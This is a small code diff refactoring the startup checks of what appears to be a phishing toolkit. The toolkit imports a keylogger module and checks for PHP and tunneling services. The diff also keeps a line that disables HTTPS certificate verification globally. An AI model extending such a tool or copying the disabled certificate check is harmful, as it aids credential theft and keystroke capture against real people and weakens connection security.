@@ -4,7 +4,6 @@
 #    This is free software, and you are welcome to redistribute it
 #    under certain conditions; you can read LICENSE for details.
 #
-from Defs.Checks import *
 from os import system, environ
 import Defs.ActionManager.main_runner as main_runner
 import Defs.FeatureManager.keylogger as keylogger
@@ -26,15 +25,15 @@ if agreement != True:
 if(not environ.get('PYTHONHTTPSVERIFY', "") and getattr(ssl, '_create_unverified_context', None)):
     ssl._create_default_https_context = ssl._create_unverified_context
 
-checkPermissions()
-checkConnection()
-verCheck()
-checkPHP()
-checkLocalxpose()
-checkNgrok()
-checkOpenport()
-checkPagekite()
-checkLT()
+simple_informant.check_permissions()
+simple_informant.verify_connection()
+# verCheck() # For now it's useless, i'll rewrite it later, after release.
+simple_informant.check_php()
+#checkLocalxpose()
+
+#checkOpenport()
+#checkPagekite()
+#checkLT()
 
 if __name__ == "__main__":
     try:
